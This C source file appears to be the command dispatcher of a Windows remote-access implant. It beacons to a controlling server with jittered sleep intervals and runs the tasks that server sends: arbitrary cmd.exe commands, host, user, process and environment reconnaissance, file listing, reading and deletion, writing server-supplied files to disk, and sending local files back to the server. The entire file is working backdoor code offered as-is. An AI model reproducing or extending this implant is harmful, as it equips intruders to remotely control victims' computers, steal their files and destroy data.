#include "commands.h"
#include "transport.h"
#include "config.h"
#include "b64.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Dynamic sleep/jitter (updated by SLEEP command)
int g_sleep_sec  = AGENT_SLEEP_SEC;
int g_jitter_pct = AGENT_JITTER_PCT;

// ── Shell execution ───────────────────────────────────────────────────────────

static char* run_shell(const char *cmd) {
    // Use _popen to capture stdout+stderr
    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /s /c \"%s\" 2>&1", cmd);

    FILE *f = _popen(full_cmd, "r");
    if (!f) return strdup("[error: popen failed]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { _pclose(f); return strdup("[error: oom]"); }

    int c;
    while ((c = fgetc(f)) != EOF) {
        if (len + 2 >= cap) {
            cap *= 2;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        buf[len++] = (char)c;
    }
    buf[len] = '\0';
    _pclose(f);
    return buf;
}

// ── Directory listing ─────────────────────────────────────────────────────────

static char* do_ls(const char *path) {
    char pattern[MAX_PATH];
    if (!path || !path[0]) {
        GetCurrentDirectoryA(sizeof(pattern), pattern);
        strncat(pattern, "\\*", sizeof(pattern) - strlen(pattern) - 1);
    } else {
        snprintf(pattern, sizeof(pattern), "%s\\*", path);
    }

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return strdup("[error listing]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { FindClose(h); return strdup("[oom]"); }
    buf[0] = '\0';

    do {
        char line[MAX_PATH + 4];
        const char *kind = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "D" : "F";
        // Build full path for display
        char dir[MAX_PATH];
        if (!path || !path[0]) GetCurrentDirectoryA(sizeof(dir), dir);
        else strncpy(dir, path, sizeof(dir) - 1);
        snprintf(line, sizeof(line), "%s  %s\\%s\n", kind, dir, fd.cFileName);

        size_t ll = strlen(line);
        if (len + ll + 2 >= cap) {
            cap = len + ll + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        strncat(buf + len, line, cap - len - 1);
        len += ll;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return buf;
}

// ── Sysinfo ───────────────────────────────────────────────────────────────────

static char* do_sysinfo(void) {
    char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
    DWORD h_sz = sizeof(hostname), u_sz = sizeof(username);
    GetComputerNameA(hostname, &h_sz);
    GetUserNameA(username, &u_sz);
    char *buf = (char*)malloc(512);
    if (!buf) return strdup("oom");
    snprintf(buf, 512,
        "hostname=%s\nusername=%s\nos=windows/amd64\npid=%lu",
        hostname, username, (unsigned long)GetCurrentProcessId());
    return buf;
}

// ── Jitter sleep ──────────────────────────────────────────────────────────────

unsigned long sleep_ms_jitter(void) {
    unsigned long base = (unsigned long)g_sleep_sec * 1000;
    if (g_jitter_pct <= 0) return base;
    unsigned long jit = base * g_jitter_pct / 100;
    unsigned long r;
    BCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    long long delta = (long long)(r % (jit * 2 + 1)) - (long long)jit;
    long long ms = (long long)base + delta;
    if (ms < 1000) ms = 1000;
    return (unsigned long)ms;
}

// ── Dispatcher ────────────────────────────────────────────────────────────────

void dispatch_task(AgentTask *task) {
    const char *args = task->args ? task->args : "";
    char type_upper[64];
    strncpy(type_upper, task->type, sizeof(type_upper) - 1);
    for (int i = 0; type_upper[i]; i++) type_upper[i] = (char)toupper((unsigned char)type_upper[i]);

    if (strcmp(type_upper, "SHELL") == 0) {
        char *out = run_shell(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "SLEEP") == 0) {
        int sec = -1, jit = -1;
        sscanf(args, "%d %d", &sec, &jit);
        if (sec >= 0) g_sleep_sec  = sec;
        if (jit >= 0) g_jitter_pct = jit;
        agent_send_result(task->id, "[+] sleep updated", "");
    }
    else if (strcmp(type_upper, "SYSINFO") == 0) {
        char *out = do_sysinfo();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PS") == 0) {
        char *out = run_shell("tasklist /FO CSV /NH 2>&1");
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PWD") == 0) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        agent_send_result(task->id, cwd, "");
    }
    else if (strcmp(type_upper, "CD") == 0) {
        if (SetCurrentDirectoryA(args)) {
            char cwd[MAX_PATH] = {0};
            GetCurrentDirectoryA(sizeof(cwd), cwd);
            agent_send_result(task->id, cwd, "");
        } else {
            char err[64];
            snprintf(err, sizeof(err), "cd: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "LS") == 0) {
        char *out = do_ls(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "KILL") == 0) {
        agent_send_result(task->id, "bye", "");
        ExitProcess(0);
    }
    else if (strcmp(type_upper, "CAT") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64];
            snprintf(err, sizeof(err), "open: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        } else {
            DWORD fsz = GetFileSize(hf, NULL);
            char *buf = (char*)malloc(fsz + 1);
            DWORD rd = 0;
            ReadFile(hf, buf, fsz, &rd, NULL);
            CloseHandle(hf);
            buf[rd] = '\0';
            agent_send_result(task->id, buf, "");
            free(buf);
        }
    }
    else if (strcmp(type_upper, "MKDIR") == 0) {
        if (CreateDirectoryA(args, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
            agent_send_result(task->id, "[+] created", "");
        else {
            char err[64]; snprintf(err, sizeof(err), "mkdir: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "RM") == 0) {
        DWORD attr = GetFileAttributesA(args);
        int r;
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
            r = RemoveDirectoryA(args);
        else
            r = DeleteFileA(args);
        if (r) agent_send_result(task->id, "[+] removed", "");
        else {
            char err[64]; snprintf(err, sizeof(err), "rm: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "ENV") == 0) {
        char *out = run_shell("set");
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "UPLOAD") == 0) {
        // args = JSON {"filename":"...","remote_path":"..."}
        char filename[256] = {0}, remote_path[MAX_PATH] = {0};
        // minimal JSON extraction
        const char *p = strstr(args, "\"filename\"");
        if (p) {
            p = strchr(p + 10, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(filename)-1) filename[i++] = *p++;
            filename[i] = '\0'; }
        }
        p = strstr(args, "\"remote_path\"");
        if (p) {
            p = strchr(p + 13, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(remote_path)-1) remote_path[i++] = *p++;
            remote_path[i] = '\0'; }
        }
        if (!filename[0] || !remote_path[0]) {
            agent_send_result(task->id, "", "upload: missing fields"); return;
        }
        size_t data_len = 0;
        uint8_t *data = agent_download_file(filename, &data_len);
        if (!data) { agent_send_result(task->id, "", "download from server failed"); return; }
        HANDLE hf = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            free(data);
            char err[64]; snprintf(err, sizeof(err), "write: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD wr = 0;
        WriteFile(hf, data, (DWORD)data_len, &wr, NULL);
        CloseHandle(hf);
        free(data);
        char msg[256];
        snprintf(msg, sizeof(msg), "written %zu bytes to %s", data_len, remote_path);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "DOWNLOAD") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64]; snprintf(err, sizeof(err), "read: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD fsz = GetFileSize(hf, NULL);
        uint8_t *buf = (uint8_t*)malloc(fsz);
        DWORD rd = 0;
        ReadFile(hf, buf, fsz, &rd, NULL);
        CloseHandle(hf);

        // Extract filename from path
        const char *name = strrchr(args, '\\');
        name = name ? name + 1 : args;

        agent_upload_file(task->id, name, buf, rd);
        free(buf);
        char msg[128];
        snprintf(msg, sizeof(msg), "uploaded %lu bytes", rd);
        agent_send_result(task->id, msg, "");
    }
    else {
        char err[128];
        snprintf(err, sizeof(err), "unknown task type: %s", task->type);
        agent_send_result(task->id, "", err);
    }
}
